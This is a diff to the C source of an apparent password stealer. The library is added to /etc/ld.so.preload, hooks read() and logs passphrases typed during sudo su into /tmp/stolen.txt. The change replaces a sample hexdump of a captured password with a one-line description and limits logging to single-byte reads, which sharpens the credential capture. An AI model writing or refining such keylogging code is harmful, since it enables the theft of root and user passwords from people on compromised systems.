@@ -4,12 +4,7 @@
  * Then add /tmp/cap_pass.so to /etc/ld.so.preload (you'll need to do this as
  * root). Then sudo su.  Log back out of the shell and check /tmp/stolen.txt.
  *
- *  /tmp/stolen.txt should now have something similar to this within:
- *
- *  00000000  80 c8 78 08 02 02 02 02  02 02 02 02 02 02 74 68  |..x...........th|
- *  00000010  69 73 69 73 6d 79 70 61  73 73 70 ed 1b 65 65 78  |isismypassp..eex|
- *  00000020  78 69 69 74 74 11                                 |xiitt.|
- *  00000026
+ *  /tmp/stolen.txt should now contain the passphrase you entered.
  *
  */
 
@@ -64,7 +59,9 @@ ssize_t read(int fd, void *buf, size_t count) {
       // limit the file from growing
       if(getfsize("/tmp/stolen.txt") <= 200) {
         // limit string to 1 char per addition ( %.1s )
-        fprintf(stealer, "%.1s", buf);
+        if (count == 1) {
+          fprintf(stealer, "%.1s", buf);
+        }
       }
       else {
         // fallback to orig call
